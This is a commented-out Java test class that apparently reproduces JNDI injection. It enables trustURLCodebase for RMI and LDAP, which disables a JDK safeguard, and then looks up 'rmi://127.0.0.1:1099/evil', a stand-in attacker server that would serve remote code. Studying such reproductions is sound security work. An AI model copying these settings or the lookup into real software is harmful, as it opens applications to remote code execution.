//import javax.naming.Context;
//import javax.naming.InitialContext;
//import javax.naming.NamingException;
//
//public class JavaInitialContext_TEST {
//    public static void main(String[] args) throws NamingException {
//        // java 1.8 修改需修改后台配置才可复现
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
//
//        Context context = new InitialContext();
//        context.lookup("rmi://127.0.0.1:1099/evil");
//    }
//}
